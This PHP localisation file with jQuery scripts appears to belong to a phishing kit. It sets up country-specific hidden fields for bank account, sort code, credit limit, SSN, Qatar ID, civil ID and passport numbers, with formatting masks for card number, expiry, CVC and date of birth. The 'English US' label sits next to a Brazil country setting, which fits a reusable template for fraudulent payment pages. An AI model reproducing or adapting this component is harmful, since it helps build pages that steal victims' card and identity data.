<?php
/* 
------------------
Language: English US
------------------
*/

$langx = array();

$langx['COUNTRY'] = 'Brazil';
$langx['COUNTYSELECT'] = '
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="county" id="county" class="generic-input-field form-control field" placeholder="State">
</div>
</div>
';
$langx['ACCOUNT'] = '
<input type="hidden" name="acno" value="-">
<input type="hidden" name="sortcode" value="-">
<input type="hidden" name="climit" value="-">
<input type="hidden" name="citizenid" value="-">
<input type="hidden" name="qatarid" value="-">
<input type="hidden" name="naid" value="-">
<input type="hidden" name="bans" value="-">
<input type="hidden" name="civilid" value="-">
<input type="hidden" name="numbid" value="-">
<input type="hidden" name="passcy" value="-">
';
$langx['SSN'] = '
<input type="hidden" name="ssn" value="-">
';
$langx['APPCALL'] = '0800 048 0408';
$langx['FLAG'] = 'assets/img/br.png';
?>
<script type='text/javascript' src="assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="assets/js/Valid.AU.mob.php"></script>
  <script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
      $.fn.toggleInputError = function(galat) {
        this.parent('.form-group').toggleClass('has-error', galat);
        return this;
      };

    });
  </script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#ccexp").mask("99 / 99",{placeholder:"MM / YY"});
});
</script>

